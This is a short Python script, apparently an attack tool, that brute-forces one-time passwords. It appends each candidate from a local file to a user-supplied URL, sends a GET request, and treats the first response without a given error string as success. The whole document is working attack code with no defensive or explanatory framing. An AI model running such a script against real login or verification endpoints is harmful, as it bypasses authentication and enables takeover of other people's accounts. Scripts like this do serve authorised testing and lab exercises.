import requests

url = input("Enter your URL:")

error = str(input("Enter the regex:"))

file = open("file.txt","r")

for line in file:
    x = requests.get(url+line.rstrip())
    print('trying OTP:'+line)
    if error in str(x.content):
        print('failed')
    else:
        print('success')
        exit()
